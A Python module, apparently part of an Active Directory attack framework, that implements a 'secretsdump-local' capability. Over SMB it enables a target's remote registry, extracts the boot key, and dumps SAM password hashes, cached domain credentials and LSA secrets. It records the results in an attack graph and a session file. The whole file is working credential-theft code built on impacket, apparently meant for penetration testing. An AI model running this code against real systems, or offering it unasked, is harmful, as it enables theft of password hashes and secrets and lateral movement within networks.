"""Remote SAM / LSA / NLKM / DPAPI secret dump against a compromised host."""

from __future__ import annotations

import json
from typing import Any

from rich.console import Console

from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.impacket_helper import require_impacket, smb_connect
from adaf_attack.core.redaction import redact
from adaf_attack.core.registry import register_capability
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()


@register_capability(
    id="secretsdump-local",
    summary="Dump SAM/LSA/NLKM/DPAPI secrets from a host (registry / LSA, no NTDS)",
    category="credential-access",
    tags=("secretsdump", "sam", "lsa", "dpapi", "cached-creds"),
)
class SecretsdumpLocal:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_impacket("secretsdump-local")
        host = kwargs.get("host") or target.dc_ip
        console.print(f"[bold]secretsdump-local[/bold] → {host}")

        from impacket.examples.secretsdump import (
            LSASecrets,
            RemoteOperations,
            SAMHashes,
        )

        conn = smb_connect(host, target)
        remote = RemoteOperations(conn, doKerberos=target.use_kerberos, kdcHost=target.dc_ip)
        remote.setExecMethod("smbexec")
        try:
            remote.enableRegistry()
            bootkey = remote.getBootKey()
        except Exception as exc:  # noqa: BLE001
            raise RuntimeError(f"registry enable / bootkey failed: {exc}") from exc

        sam_records: list[str] = []
        lsa_records: list[str] = []

        def _sam(secret: Any) -> None:
            sam_records.append(str(secret))

        def _lsa(secret: Any) -> None:
            lsa_records.append(str(secret))

        try:
            sam = SAMHashes(None, bootkey, isRemote=True, remoteOps=remote, perSecretCallback=_sam)
            sam.dump()
            sam.finish()
        except Exception as exc:  # noqa: BLE001
            console.print(f"[yellow]SAM: {exc}[/yellow]")
        try:
            lsa = LSASecrets(
                None,
                bootkey,
                remote,
                isRemote=True,
                history=False,
                perSecretCallback=lambda kind, secret: _lsa(secret),
            )
            lsa.dumpCachedHashes()
            lsa.dumpSecrets()
            lsa.finish()
        except Exception as exc:  # noqa: BLE001
            console.print(f"[yellow]LSA: {exc}[/yellow]")
        try:
            remote.finish()
        except Exception:  # noqa: BLE001
            pass

        for record in sam_records:
            parts = record.split(":")
            if len(parts) >= 4:
                sam = parts[0]
                node = f"LOCALUSER@{sam.upper()}@{host.upper()}"
                graph.add_node(node, "LocalUser", sam=sam, host=host)
                graph.add_edge(node, node, "HasLocalHash")

        result = {
            "host": host,
            "sam_entries": [{"raw": r} for r in sam_records],
            "lsa_entries": [{"raw": r} for r in lsa_records],
            "sam_count": len(sam_records),
            "lsa_count": len(lsa_records),
        }
        redacted = redact(result, include_secrets=include_secrets)
        out = session.path("local-secrets.json")
        out.write_text(json.dumps(redacted, indent=2, default=str), encoding="utf-8")
        graph.save(session.path("graph.json"))
        session.log(
            "secretsdump-local.complete",
            host=host,
            sam=len(sam_records),
            lsa=len(lsa_records),
            include_secrets=include_secrets,
        )
        console.print(
            f"[green]Done[/green]  sam={len(sam_records)}  lsa={len(lsa_records)}"
        )
        return dict(redacted) if isinstance(redacted, dict) else result
